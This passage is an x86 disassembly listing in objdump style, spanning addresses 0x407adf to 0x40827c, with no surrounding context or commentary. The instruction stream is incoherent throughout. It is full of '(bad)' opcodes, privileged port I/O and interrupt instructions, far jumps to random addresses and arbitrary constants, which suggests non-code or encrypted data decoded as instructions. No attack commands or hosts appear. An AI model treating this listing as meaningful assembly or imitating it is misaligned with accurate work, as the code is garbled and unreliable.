  407adf:	scas   al,BYTE PTR es:[edi]
  407ae0:	xchg   eax,ecx
  407ae2:	cmp    bl,bh
  407ae4:	test   al,0xf0
  407ae6:	les    edi,FWORD PTR [ebp+0x70]
  407ae9:	and    eax,0xea025407
  407aee:	outs   dx,BYTE PTR ds:[esi]
  407aef:	fst    QWORD PTR [edx]
  407af1:	scas   eax,DWORD PTR es:[edi]
  407af2:	inc    ebp
  407af3:	jecxz  0x407b70
  407af5:	xchg   ebx,eax
  407af6:	inc    edx
  407af7:	fadd   DWORD PTR [eax+0x49]
  407afa:	es cwd 
  407afd:	inc    ecx
  407afe:	push   esi
  407aff:	pushf  
  407b00:	and    BYTE PTR [esi],0xa7
  407b03:	jne    0x407b40
  407b05:	(bad)  
  407b06:	push   edx
  407b07:	push   ss
  407b08:	inc    ebx
  407b09:	ja     0x407b42
  407b0b:	mov    ecx,0x2c9e553
  407b10:	scas   eax,DWORD PTR es:[edi]
  407b11:	ret    0xf5cd
  407b14:	popa   
  407b15:	push   esi
  407b16:	mov    cl,0xc0
  407b18:	inc    ecx
  407b19:	adc    dl,BYTE PTR [ebp-0x5c]
  407b1c:	enter  0x8f7f,0x5e
  407b20:	adc    eax,0x9da5be5f
  407b25:	sub    al,0x68
  407b27:	jl     0x407adf
  407b29:	shl    BYTE PTR [edx],1
  407b2b:	mov    esp,ebx
  407b2d:	(bad)  
  407b2e:	scas   eax,DWORD PTR es:[edi]
  407b2f:	cmc    
  407b30:	or     BYTE PTR [ebx-0x47],bl
  407b33:	xchg   ebx,eax
  407b34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b35:	mov    esi,DWORD PTR [ecx]
  407b37:	rol    DWORD PTR [ecx+0x5cf46194],0x4e
  407b3e:	test   DWORD PTR [edx-0x156b8f99],ebp
  407b44:	dec    edx
  407b45:	int3   
  407b46:	aad    0x2
  407b48:	cmp    eax,0xbb090822
  407b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b4e:	push   eax
  407b4f:	mov    ecx,0x96fe5d40
  407b54:	adc    BYTE PTR ds:0x50f72ea5,0x54
  407b5b:	add    BYTE PTR [ecx-0x75ebfd14],bl
  407b61:	test   ch,bl
  407b63:	addr16 push 0xffffffe7
  407b66:	aaa    
  407b67:	cmp    eax,0x95a96fd
  407b6c:	ja     0x407af7
  407b6e:	add    al,0x6d
  407b70:	mov    eax,ds:0xfc783a09
  407b75:	dec    ecx
  407b76:	in     al,0xcb
  407b78:	aad    0xe0
  407b7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b7b:	push   cs
  407b7c:	dec    edi
  407b7d:	sbb    edx,esp
  407b7f:	lea    ebp,[edx]
  407b81:	ss mov ch,0x93
  407b84:	jge    0x407bf4
  407b86:	popa   
  407b87:	push   ebp
  407b88:	repnz outs dx,BYTE PTR ds:[esi]
  407b8a:	pop    edx
  407b8b:	das    
  407b8c:	pop    ebp
  407b8d:	test   eax,0x2186d0d0
  407b92:	lods   al,BYTE PTR ds:[esi]
  407b93:	pop    eax
  407b94:	dec    edx
  407b95:	shr    bl,cl
  407b97:	xor    ebx,DWORD PTR [ebx+0x37e5f519]
  407b9d:	adc    ebx,esp
  407b9f:	sti    
  407ba0:	inc    esp
  407ba1:	int    0x3c
  407ba3:	jnp    0x407b35
  407ba5:	out    0x8f,al
  407ba7:	mov    ebx,0x70a5bc94
  407bac:	xor    esi,DWORD PTR [ecx]
  407bae:	jb     0x407b86
  407bb0:	add    esi,DWORD PTR [edi-0x76]
  407bb3:	sub    al,BYTE PTR [ecx]
  407bb5:	sahf   
  407bb6:	mov    cl,0x5e
  407bb8:	hlt    
  407bb9:	fist   DWORD PTR [edi+0x3a]
  407bbc:	fs or  al,0x1e
  407bbf:	aad    0xdc
  407bc1:	jge    0x407bcc
  407bc3:	ins    DWORD PTR es:[edi],dx
  407bc4:	inc    eax
  407bc5:	cmp    al,al
  407bc7:	fs fwait
  407bc9:	mov    ds:0xa8917beb,eax
  407bce:	call   0xb0ccfea
  407bd3:	jne    0x407b66
  407bd5:	aam    0x3
  407bd7:	mov    eax,0x1706becd
  407bdc:	retf   
  407bdd:	adc    BYTE PTR [ebx],dh
  407bdf:	fisub  DWORD PTR [ecx+0x6cb2939f]
  407be5:	retf   0x9bbf
  407be8:	mov    esi,0xefc179a3
  407bed:	cmp    edx,DWORD PTR [edi+0x24]
  407bf0:	mov    ecx,0xe1e5465e
  407bf5:	ins    BYTE PTR es:[edi],dx
  407bf6:	iret   
  407bf7:	or     esp,DWORD PTR [edx+0x2e5cf032]
  407bfd:	jnp    0x407c2b
  407bff:	xchg   esp,eax
  407c00:	sbb    ebp,DWORD PTR [ebp-0x70637d27]
  407c06:	or     al,0x57
  407c08:	xchg   bh,dl
  407c0a:	out    dx,al
  407c0b:	test   BYTE PTR [edx],bh
  407c0d:	js     0x407bcc
  407c0f:	out    0x52,al
  407c11:	rcr    bh,cl
  407c13:	and    al,0x2c
  407c15:	cwde   
  407c16:	inc    ebp
  407c17:	and    ch,BYTE PTR ss:[ecx-0x26]
  407c1b:	mov    eax,ds:0x763e15ff
  407c20:	push   ecx
  407c21:	xchg   esp,eax
  407c22:	arpl   sp,di
  407c24:	call   0xb6e6a36b
  407c29:	das    
  407c2a:	push   ebx
  407c2c:	mov    eax,ds:0x42e2b7
  407c31:	dec    edx
  407c32:	jmp    0x409f81
  407c37:	mov    al,0x4e
  407c39:	cmp    bh,ch
  407c3b:	mov    ds:0xc733738b,al
  407c40:	sbb    BYTE PTR ds:0xb286b3e6,cl
  407c46:	cs push es
  407c48:	cmp    bh,BYTE PTR [esp+edi*2+0x4e]
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	mov    bl,0xd4
  407c51:	ins    BYTE PTR es:[edi],dx
  407c52:	daa    
  407c53:	xchg   ecx,eax
  407c54:	add    DWORD PTR [edx],edx
  407c56:	fnsave [edi]
  407c58:	jns    0x407c7a
  407c5a:	or     ah,BYTE PTR [ebx]
  407c5c:	lock mov eax,ds:0x4329f3ca
  407c62:	daa    
  407c63:	sar    DWORD PTR [eax+ecx*2-0x55],cl
  407c67:	or     al,0x49
  407c69:	or     ah,bh
  407c6b:	adc    dl,ch
  407c6d:	sub    al,0xe2
  407c6f:	leave  
  407c70:	add    edx,ebx
  407c72:	loop   0x407ca7
  407c74:	ins    BYTE PTR es:[edi],dx
  407c75:	inc    edx
  407c76:	jg     0x407c47
  407c78:	mov    es:0x378438d4,al
  407c7e:	scas   eax,DWORD PTR es:[edi]
  407c7f:	push   esp
  407c80:	mov    esi,edx
  407c82:	mov    al,0x65
  407c84:	mov    dl,0xec
  407c86:	adc    eax,0x2a550bda
  407c8b:	push   ebp
  407c8c:	sub    DWORD PTR [ebx+eax*2+0x602f5d00],ebx
  407c93:	inc    ebx
  407c94:	stos   BYTE PTR es:[edi],al
  407c95:	mov    ?,WORD PTR [edx+ecx*4-0x25]
  407c99:	daa    
  407c9a:	in     eax,0x16
  407c9c:	xor    al,0xb5
  407c9e:	icebp  
  407c9f:	aaa    
  407ca0:	adc    BYTE PTR [esp+edx*1],0xb6
  407ca4:	sub    eax,0x3b03990d
  407ca9:	(bad)  
  407cab:	sub    ecx,0xffffff91
  407cae:	out    0x21,al
  407cb0:	add    ecx,ebp
  407cb2:	or     al,0x78
  407cb4:	fstp   st(5)
  407cb6:	sbb    edi,DWORD PTR [ecx+edi*1+0x39]
  407cba:	lods   al,BYTE PTR ds:[esi]
  407cbb:	xor    eax,0xcd4beed4
  407cc0:	mov    ebp,0x1f4b1484
  407cc5:	cmp    ah,BYTE PTR [edx]
  407cc7:	inc    eax
  407cc8:	sbb    edi,DWORD PTR [edi-0x69]
  407ccb:	sub    al,0xf9
  407ccd:	xor    DWORD PTR [eax-0x1a4b6373],ebx
  407cd3:	imul   edi
  407cd5:	jne    0x407cf3
  407cd7:	add    ch,BYTE PTR [ebx+0x465b2d5c]
  407cdd:	adc    al,0xc0
  407cdf:	test   eax,0x87638556
  407ce4:	dec    edx
  407ce5:	fisub  WORD PTR [edx+0x3d]
  407ce8:	cmp    DWORD PTR [edi+eax*1-0xcdcd43d],edi
  407cef:	in     eax,0x9a
  407cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cf2:	xchg   edi,eax
  407cf3:	adc    eax,DWORD PTR gs:[ecx]
  407cf6:	xchg   esp,eax
  407cf7:	sbb    BYTE PTR [bp+di],ah
  407cfa:	pop    ss
  407cfb:	mov    cl,0x4e
  407cfd:	dec    ecx
  407cfe:	jle    0x407c99
  407d00:	rcr    DWORD PTR [esi+edx*4+0x7f],cl
  407d04:	shr    BYTE PTR [esi-0x16],cl
  407d07:	clc    
  407d08:	ins    BYTE PTR es:[edi],dx
  407d09:	mov    al,0xa0
  407d0b:	or     al,0x9d
  407d0d:	cmp    al,0x45
  407d0f:	stos   BYTE PTR es:[edi],al
  407d10:	inc    ebp
  407d11:	pop    esp
  407d12:	(bad)  
  407d14:	pop    edx
  407d15:	push   0xffffffd4
  407d17:	pusha  
  407d18:	call   0x6371:0x3116fc2a
  407d1f:	out    0x32,eax
  407d21:	stc    
  407d22:	xor    eax,0x929e2459
  407d27:	and    DWORD PTR [edi-0x2ed5b722],ebx
  407d2d:	ins    BYTE PTR es:[edi],dx
  407d2e:	xchg   BYTE PTR [ecx],ah
  407d30:	in     al,dx
  407d31:	push   0x52
  407d33:	in     eax,0x27
  407d35:	lods   al,BYTE PTR ds:[esi]
  407d36:	push   es
  407d37:	adc    BYTE PTR [esi],0x5d
  407d3a:	les    edi,FWORD PTR [ebp+0x29f19667]
  407d40:	dec    ebx
  407d41:	out    dx,al
  407d42:	sub    eax,0xe1ea7538
  407d47:	pop    es
  407d48:	cmp    ebx,edi
  407d4a:	xor    al,0xfb
  407d4c:	or     BYTE PTR ds:[ebx+0x7c],dh
  407d50:	mov    ds:0x26e8e4d2,eax
  407d55:	and    eax,0xf670719f
  407d5a:	jmp    0x6c40:0x737c2407
  407d61:	push   esi
  407d62:	pop    esp
  407d63:	call   0xec1a:0xd3397f96
  407d6a:	pmaxub mm3,mm0
  407d6d:	dec    esi
  407d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d6f:	mov    al,ds:0x2d413895
  407d74:	pop    eax
  407d75:	xchg   ebx,eax
  407d76:	mov    bl,0x4
  407d78:	adc    DWORD PTR [edx+ecx*2-0x3a],0x4
  407d7d:	add    BYTE PTR [ecx+0x2da436b0],cl
  407d83:	pusha  
  407d84:	aas    
  407d85:	test   al,0x17
  407d87:	in     eax,0xa9
  407d89:	jae    0x407d60
  407d8b:	dec    esp
  407d8c:	xor    ebx,DWORD PTR [bx+si-0x7]
  407d90:	pop    es
  407d91:	jo     0x407da7
  407d93:	dec    esi
  407d94:	mov    ds:0x903238fa,eax
  407d99:	jge    0x407dc4
  407d9b:	add    DWORD PTR [eax],esi
  407d9d:	data16 fnstsw WORD PTR [ebx+0x77ad273c]
  407da4:	push   edi
  407da5:	test   BYTE PTR [esi+0x4919f264],0x8f
  407dac:	pop    ecx
  407dad:	loopne 0x407d62
  407daf:	pop    ecx
  407db0:	das    
  407db1:	ds xchg ebx,eax
  407db3:	test   DWORD PTR [edx],ebp
  407db5:	or     al,BYTE PTR [esi]
  407db7:	icebp  
  407db8:	pop    ebx
  407db9:	or     eax,DWORD PTR ds:0xdd3ae421
  407dbf:	into   
  407dc0:	sti    
  407dc1:	sbb    eax,0x38b5eda8
  407dc6:	stos   DWORD PTR es:[edi],eax
  407dc7:	pop    edx
  407dc8:	cmc    
  407dc9:	call   0xd401:0xfcdbdf33
  407dd0:	jg     0x407df3
  407dd2:	dec    ecx
  407dd3:	mov    ecx,0xb7b2d901
  407dd8:	jo     0x407d9e
  407dda:	out    0x43,eax
  407ddc:	xchg   esp,eax
  407ddd:	sar    BYTE PTR [ebx+0x18],0x0
  407de1:	out    0x1d,eax
  407de3:	or     eax,0x74b6d25e
  407de8:	fs mov dh,0x7
  407deb:	pop    ebp
  407dec:	or     eax,DWORD PTR [esi]
  407dee:	push   ds
  407def:	bound  ecx,QWORD PTR [edi+0x4f]
  407df2:	sar    BYTE PTR [ebx+0x7e34ebaa],cl
  407df8:	bound  ebx,QWORD PTR [ebx-0x73]
  407dfb:	or     al,0x92
  407dfd:	mov    esp,0x60833d5
  407e02:	and    al,0x7a
  407e04:	rcr    DWORD PTR [ecx+eax*8+0x59],cl
  407e08:	enter  0xf6d9,0x31
  407e0c:	(bad)  
  407e0d:	sti    
  407e0e:	mov    esp,0xae7d5b4c
  407e13:	cmp    ah,BYTE PTR [ebx]
  407e15:	sub    eax,0x5c11bbd0
  407e1a:	out    0xc3,al
  407e1c:	cmp    bl,cl
  407e1e:	xor    bh,al
  407e20:	ret    
  407e21:	jg     0x407e30
  407e23:	sar    BYTE PTR [esi-0x4c2df24b],cl
  407e29:	fs cdq 
  407e2b:	push   edx
  407e2c:	sbb    BYTE PTR [edi-0x7f267f0b],bl
  407e32:	or     ch,0x9d
  407e35:	xor    al,0x2b
  407e37:	and    BYTE PTR [ebx-0x6e],cl
  407e3a:	repnz pop ebx
  407e3c:	sbb    al,0x67
  407e3e:	dec    esp
  407e3f:	and    esp,esi
  407e41:	test   DWORD PTR [edi-0x28],esp
  407e44:	sbb    bh,al
  407e46:	jnp    0x407e95
  407e48:	dec    esp
  407e49:	xchg   edx,eax
  407e4a:	mov    ds:0x12043b3f,al
  407e4f:	(bad)  
  407e50:	ins    BYTE PTR es:[edi],dx
  407e51:	xor    al,0x50
  407e54:	push   ss
  407e55:	test   al,0xde
  407e57:	imul   ebx,DWORD PTR [ebx+0x13],0xffffffaf
  407e5b:	inc    ecx
  407e5c:	(bad)
  407e60:	push   ebp
  407e61:	cld    
  407e62:	jnp    0x407dfe
  407e64:	dec    edx
  407e65:	cmp    esp,ecx
  407e67:	xchg   bl,al
  407e69:	rcr    dh,0x27
  407e6c:	mov    es,WORD PTR [eiz*2-0x6f70eaf9]
  407e73:	repnz mov cl,0x3
  407e76:	data16 sub cl,BYTE PTR [ebx]
  407e79:	imul   edi,DWORD PTR [ecx+0x4ae886d9],0x513d8251
  407e83:	fsub   QWORD PTR [eax+eiz*1-0x77]
  407e87:	or     ecx,DWORD PTR [edx]
  407e89:	lock std 
  407e8b:	jmp    0x8dde:0x8535ffa6
  407e92:	lock xchg esp,eax
  407e94:	es retf 0x8f0c
  407e98:	fdiv   QWORD PTR [ecx-0x47]
  407e9b:	add    eax,0xe256b4e6
  407ea0:	das    
  407ea1:	(bad)  
  407ea2:	cld    
  407ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ea4:	sub    bl,al
  407ea6:	aaa    
  407ea7:	cld    
  407ea8:	test   al,0x7
  407eaa:	mov    ds,WORD PTR [ebx]
  407eac:	push   eax
  407ead:	mov    bl,0x7b
  407eaf:	lock cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  407eb2:	sbb    al,0xf8
  407eb4:	sbb    BYTE PTR [edi+esi*2],bh
  407eb7:	adc    esi,DWORD PTR [ebp-0x49c5741e]
  407ebd:	sub    ebx,DWORD PTR [edx+0x78]
  407ec0:	push   edi
  407ec1:	push   ebx
  407ec2:	pop    ss
  407ec3:	jnp    0x407f1b
  407ec5:	popa   
  407ec6:	add    esp,DWORD PTR [eax+0x540b87dd]
  407ecc:	xchg   ecx,eax
  407ecd:	and    esp,DWORD PTR [ecx+edi*1-0x80]
  407ed1:	xor    eax,0x489f0d32
  407ed6:	clc    
  407ed7:	(bad)  
  407ed8:	or     ah,BYTE PTR [edx-0x6bd88856]
  407ede:	push   esi
  407edf:	mov    DWORD PTR [ebx],esi
  407ee1:	mov    ah,0x21
  407ee3:	or     al,BYTE PTR [esi+0x503c8b10]
  407ee9:	div    BYTE PTR [edi+0x52]
  407eec:	into   
  407eed:	xchg   edx,eax
  407eee:	add    cl,bh
  407ef0:	les    esi,FWORD PTR [esi]
  407ef2:	or     eax,0x64cb5544
  407ef7:	pop    es
  407ef8:	inc    esp
  407ef9:	mov    ds:0x6d68d43e,al
  407efe:	lahf   
  407eff:	adc    ah,BYTE PTR [edi]
  407f01:	inc    esp
  407f02:	dec    ecx
  407f03:	jb     0x407f74
  407f05:	mov    dl,0x84
  407f07:	push   ss
  407f08:	mov    esi,0xe6a1ff50
  407f0d:	in     eax,dx
  407f0e:	cmc    
  407f0f:	gs call 0xa762:0xbda7d73f
  407f17:	push   es
  407f18:	into   
  407f19:	jne    0x407ef1
  407f1b:	push   ebx
  407f1c:	imul   ecx,ecx,0xea170b11
  407f22:	inc    esi
  407f23:	mov    edx,0xc25385bf
  407f28:	rcl    dl,1
  407f2a:	inc    eax
  407f2b:	aam    0xf0
  407f2d:	jmp    0x54a8e4a5
  407f32:	mov    al,0xa3
  407f34:	xchg   edx,eax
  407f35:	leave  
  407f36:	not    BYTE PTR [edx]
  407f38:	into   
  407f39:	fist   DWORD PTR [esi+0x5a]
  407f3c:	ret    
  407f3d:	loopne 0x407ede
  407f3f:	sbb    BYTE PTR [esi-0x50],bh
  407f42:	ins    DWORD PTR es:[edi],dx
  407f43:	out    dx,eax
  407f44:	and    cl,bl
  407f46:	cld    
  407f47:	test   BYTE PTR [ecx+0x7ebfc943],0x10
  407f4e:	mov    edi,0x1817e776
  407f53:	xchg   ecx,eax
  407f54:	cwde   
  407f55:	cmp    ecx,DWORD PTR [ebp+0x5f]
  407f58:	call   0xd1a37b95
  407f5d:	bound  ebx,QWORD PTR [edx]
  407f5f:	loope  0x407f12
  407f61:	dec    edx
  407f62:	push   eax
  407f63:	jno    0x407eeb
  407f65:	stos   WORD PTR es:[edi],ax
  407f67:	xchg   edi,eax
  407f68:	test   al,0x9c
  407f6a:	gs hlt 
  407f6c:	daa    
  407f6d:	cli    
  407f6e:	adc    BYTE PTR [esi-0x63ea6569],al
  407f74:	jp     0x407fba
  407f76:	xlat   BYTE PTR ds:[ebx]
  407f77:	dec    ecx
  407f78:	ja     0x407fe7
  407f7a:	ins    DWORD PTR es:[edi],dx
  407f7b:	ins    BYTE PTR es:[edi],dx
  407f7c:	daa    
  407f7d:	ins    DWORD PTR es:[edi],dx
  407f7e:	rol    BYTE PTR [edx],0xaa
  407f81:	sbb    ecx,DWORD PTR [ebx+ebx*2]
  407f84:	jmp    ecx
  407f86:	push   cs
  407f87:	mov    eax,0x295464c
  407f8c:	or     bh,ah
  407f8e:	pop    eax
  407f8f:	nop
  407f90:	repnz cmc 
  407f92:	fistp  DWORD PTR [ebx+esi*4]
  407f95:	pop    esi
  407f96:	les    edx,FWORD PTR [edx]
  407f98:	dec    esp
  407f99:	push   0x1
  407f9b:	out    0x60,al
  407f9d:	int    0x8e
  407f9f:	mov    ebx,0x32964db9
  407fa4:	xor    dh,BYTE PTR [eax]
  407fa6:	mov    edx,esi
  407fa8:	inc    esp
  407fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407faa:	mov    DWORD PTR [ebx-0x73],ecx
  407fad:	es fdivr st(0),st
  407fb0:	ret    
  407fb1:	repz and eax,0x75891481
  407fb7:	pop    esi
  407fb8:	and    edi,edi
  407fba:	fnstenv [eax]
  407fbc:	mov    ecx,0xbbf1b108
  407fc1:	pop    es
  407fc2:	sbb    BYTE PTR [ebp+0x55],cl
  407fc5:	cmp    al,0x27
  407fc7:	xchg   esi,eax
  407fc8:	mov    al,ds:0x33df0afe
  407fcd:	sub    eax,0x8ca716c8
  407fd2:	rcr    bh,cl
  407fd4:	and    edi,ebp
  407fd6:	icebp  
  407fd7:	daa    
  407fd8:	retf   0x4199
  407fdb:	xchg   ebx,eax
  407fdc:	sbb    al,0xde
  407fde:	inc    edi
  407fdf:	icebp  
  407fe0:	aas    
  407fe1:	fsub   DWORD PTR [ebx+0x25f7753c]
  407fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fe9:	arpl   WORD PTR [edx+0x23],ax
  407fec:	call   0x66487742
  407ff1:	mov    eax,0x159aebb9
  407ff6:	shr    DWORD PTR [esi+ebx*2-0x327861f4],0xac
  407ffe:	aam    0x3
  408000:	ret    0x3c54
  408003:	repz pop ss
  408005:	neg    DWORD PTR [edi]
  408007:	sbb    eax,0xfdab3f6b
  40800c:	scas   al,BYTE PTR es:[edi]
  40800d:	cmp    BYTE PTR [edi-0x4f5af885],al
  408013:	dec    ebx
  408014:	cs xchg DWORD PTR gs:[edx+0x59],ebp
  408019:	pop    edi
  40801a:	mov    bh,0xc3
  40801c:	jmp    0x40805f
  40801e:	scas   al,BYTE PTR es:[edi]
  40801f:	cmp    DWORD PTR [esi-0x4f706982],edi
  408025:	(bad)  
  408027:	nop
  408028:	xchg   esi,eax
  408029:	jns    0x407fd7
  40802b:	aam    0x97
  40802d:	sub    eax,0x461bdd29
  408032:	inc    edx
  408033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408034:	fist   WORD PTR [esi]
  408036:	(bad)  
  408037:	fbld   TBYTE PTR [ecx]
  408039:	mov    ebx,0x1df12200
  40803e:	inc    eax
  40803f:	sub    cl,BYTE PTR [edx-0x4981cffd]
  408045:	fwait
  408046:	out    dx,eax
  408047:	out    0xc9,al
  408049:	into   
  40804a:	pop    es
  40804b:	mov    ebp,DWORD PTR [edx+edx*4+0x7cf8d66e]
  408052:	xor    edi,DWORD PTR [edx+0x5b]
  408055:	mov    ecx,0xaea3f0a1
  40805a:	xchg   ecx,eax
  40805b:	cmc    
  40805c:	inc    ebp
  40805d:	xchg   ebp,eax
  40805e:	jg     0x408002
  408060:	hlt    
  408061:	(bad)  
  408062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408063:	(bad)  
  408064:	(bad)  
  408066:	daa    
  408067:	pop    edx
  408068:	mov    ds:0xfbeac153,al
  40806d:	ds dec edi
  40806f:	mov    ch,ah
  408071:	iret   
  408072:	data16 aas 
  408074:	mov    al,ds:0x43c2277b
  408079:	loopne 0x40803d
  40807b:	cmp    cl,0x83
  40807e:	inc    esi
  40807f:	popa   
  408080:	jmp    0x40804b
  408082:	push   es
  408083:	mov    dl,0xfb
  408085:	lahf   
  408086:	mov    dl,0x4c
  408088:	data16 rol BYTE PTR [edi-0x6a],0xad
  40808d:	add    BYTE PTR [edx-0x199195b1],dl
  408093:	sub    cl,cl
  408095:	popa   
  408096:	fs cli 
  408098:	adc    DWORD PTR [ebx],esi
  40809a:	fdiv   DWORD PTR [edi-0x74]
  40809d:	test   BYTE PTR [ebp-0x581d4b2a],dl
  4080a3:	mov    edi,0xf84f7f7c
  4080a8:	ds stos BYTE PTR es:[edi],al
  4080aa:	test   eax,0x375363db
  4080af:	or     eax,DWORD PTR [ebp+0x7c3bd16f]
  4080b5:	sub    esp,esp
  4080b7:	mov    gs,ecx
  4080b9:	pop    ss
  4080ba:	ror    DWORD PTR [ebx+0x40],0xf3
  4080be:	sar    DWORD PTR [esi],cl
  4080c0:	test   al,0xf
  4080c2:	pop    edi
  4080c3:	cld    
  4080c4:	inc    edi
  4080c5:	xchg   BYTE PTR [edx],bl
  4080c7:	push   ds
  4080c8:	ret    
  4080c9:	mov    ebx,0xa0c4df68
  4080ce:	mov    ds:0x85ae639f,eax
  4080d3:	push   ebp
  4080d4:	cld    
  4080d5:	retf   
  4080d6:	xor    DWORD PTR [edi+ecx*8],edi
  4080d9:	jne    0x408068
  4080db:	mov    bh,0xf
  4080dd:	into   
  4080de:	stos   DWORD PTR es:[edi],eax
  4080df:	outs   dx,BYTE PTR ds:[esi]
  4080e0:	cmc    
  4080e1:	inc    ebp
  4080e2:	(bad)  
  4080e3:	stc    
  4080e4:	mov    ah,0xa6
  4080e6:	test   eax,0xd0c51a12
  4080eb:	repz xchg ah,bl
  4080ee:	pop    eax
  4080ef:	pop    esi
  4080f0:	aaa    
  4080f1:	sar    BYTE PTR [esi+0x6570d190],cl
  4080f7:	popf   
  4080f8:	leave  
  4080f9:	xor    dl,al
  4080fb:	push   0x63
  4080fd:	cmp    eax,0xe8e5af35
  408102:	mov    al,0x5
  408104:	and    esp,DWORD PTR [esi]
  408106:	es ins DWORD PTR es:[edi],dx
  408108:	and    bh,dh
  40810a:	dec    ebp
  40810b:	jb     0x408107
  40810d:	lahf   
  40810e:	mov    al,ds:0x87955865
  408113:	pop    eax
  408114:	adc    DWORD PTR [ebp-0x6e23b140],edx
  40811a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40811b:	arpl   bp,bp
  40811d:	xor    eax,0x9fd107d4
  408122:	and    ah,BYTE PTR [esi+ecx*2]
  408125:	sub    dl,dl
  408127:	int    0xe7
  408129:	sbb    DWORD PTR [esi],eax
  40812b:	mov    esi,0x4bd6dbce
  408130:	pusha  
  408131:	(bad)  
  408132:	scas   eax,DWORD PTR es:[edi]
  408133:	out    dx,al
  408134:	pop    edi
  408135:	or     BYTE PTR [ebx-0x77],bh
  408138:	test   eax,0x61609e65
  40813d:	jp     0x4081af
  40813f:	mov    dl,0x32
  408141:	and    BYTE PTR [ebx-0x2230bcfb],dh
  408147:	rcr    BYTE PTR [esi-0x5c5fa2d9],cl
  40814d:	adc    al,0xe0
  40814f:	add    dl,BYTE PTR [edx-0x225072b1]
  408155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408156:	gs sbb eax,0xf804c9a2
  40815c:	popf   
  40815d:	into   
  40815e:	push   edi
  40815f:	sbb    eax,0x87ea8118
  408164:	mov    edi,0x18d50959
  408169:	push   cs
  40816a:	out    0x9f,al
  40816c:	aaa    
  40816d:	push   es
  40816e:	out    dx,al
  40816f:	dec    eax
  408170:	mov    ds:0xb1831c7b,eax
  408175:	les    edx,FWORD PTR [edi]
  408177:	(bad)  
  408178:	pop    ebp
  408179:	out    0x7a,eax
  40817b:	dec    edx
  40817c:	adc    DWORD PTR [ebx-0x44be0ce9],ecx
  408182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408183:	in     al,dx
  408184:	test   ecx,0x9eee51ef
  40818a:	lock jecxz 0x408189
  40818d:	gs cmp al,0x3c
  408190:	xor    esp,DWORD PTR [ebx-0x63f2a96d]
  408196:	add    ah,dh
  408198:	mov    esi,0x32e1aaa6
  40819d:	push   eax
  40819e:	cdq    
  40819f:	jbe    0x40813f
  4081a1:	xchg   edx,eax
  4081a2:	jae    0x40812b
  4081a4:	js     0x4081cf
  4081a6:	dec    edx
  4081a7:	jne    0x4081ca
  4081a9:	xchg   edi,eax
  4081aa:	imul   edx,DWORD PTR [ebx+0x9fe3435],0x20
  4081b1:	test   BYTE PTR [ebx+edi*4+0x5075b299],dh
  4081b8:	pop    es
  4081b9:	push   ecx
  4081ba:	repnz imul esp,DWORD PTR [ebx+0x14],0xffffffa6
  4081bf:	mov    ecx,0xf6342f8a
  4081c4:	jecxz  0x408180
  4081c6:	jnp    0x408174
  4081c8:	sub    BYTE PTR [edi],bl
  4081ca:	cmp    eax,0xd5b9c85c
  4081cf:	mov    ecx,0x87ba8ba
  4081d4:	or     BYTE PTR [eax-0x45],bh
  4081d7:	add    BYTE PTR [edx],ch
  4081d9:	scas   al,BYTE PTR es:[edi]
  4081da:	(bad)  
  4081db:	sti    
  4081dc:	test   eax,0xe5268bc1
  4081e1:	mov    ecx,ebx
  4081e3:	inc    eax
  4081e4:	sbb    ch,ch
  4081e6:	mov    ch,0xa8
  4081e8:	or     eax,0x2c047f3c
  4081ed:	pop    ds
  4081ee:	or     DWORD PTR [eax-0x1f085268],esp
  4081f4:	out    dx,eax
  4081f5:	scas   eax,DWORD PTR es:[edi]
  4081f6:	cs adc al,0xb5
  4081f9:	retf   0x79ad
  4081fc:	adc    BYTE PTR [edx],dl
  4081fe:	mov    dh,0x80
  408200:	iret   
  408201:	jg     0x4081be
  408203:	fisub  WORD PTR [esi-0x6d59ac3e]
  408209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40820a:	test   BYTE PTR [esp+edx*8-0x74e0e3d3],al
  408211:	inc    ecx
  408212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408213:	je     0x40819d
  408215:	scas   eax,DWORD PTR es:[edi]
  408216:	sbb    eax,0x1f06e072
  40821b:	pop    ss
  40821c:	jne    0x4081d6
  40821e:	fst    DWORD PTR fs:[ecx-0x4]
  408222:	loopne 0x4081d1
  408224:	sub    DWORD PTR ds:0xc31a1497,esp
  40822a:	pop    edi
  40822b:	and    bl,BYTE PTR [ecx+ebp*1+0x6844cb47]
  408232:	ins    DWORD PTR es:[edi],dx
  408233:	mov    ch,0xec
  408235:	mov    esi,0xc90be162
  40823a:	std    
  40823b:	(bad)  
  40823c:	dec    ecx
  40823d:	pop    ebp
  40823e:	adc    BYTE PTR gs:[esi+ebx*2+0x46ceff76],cl
  408246:	(bad)  
  408247:	pop    edx
  408248:	(bad)  
  408249:	jge    0x4081e3
  40824b:	or     eax,esp
  40824d:	imul   dh
  40824f:	repz mov eax,ds:0x474413c3
  408255:	pop    ebp
  408256:	adc    ecx,ecx
  408258:	and    BYTE PTR [esp+ebx*2+0x6f9a8ecf],al
  40825f:	fwait
  408260:	ins    BYTE PTR es:[edi],dx
  408261:	jb     0x408261
  408263:	mov    bh,0x67
  408265:	js     0x408274
  408267:	adc    ah,al
  408269:	pusha  
  40826a:	add    edx,edi
  40826c:	jbe    0x4082e9
  40826e:	xor    BYTE PTR [ecx+0x57f59af],ch
  408274:	add    al,0xb3
  408276:	shl    dh,1
  408278:	fdiv   DWORD PTR [edi+0x58]
  40827b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40827c:	jnp    0x4082ae
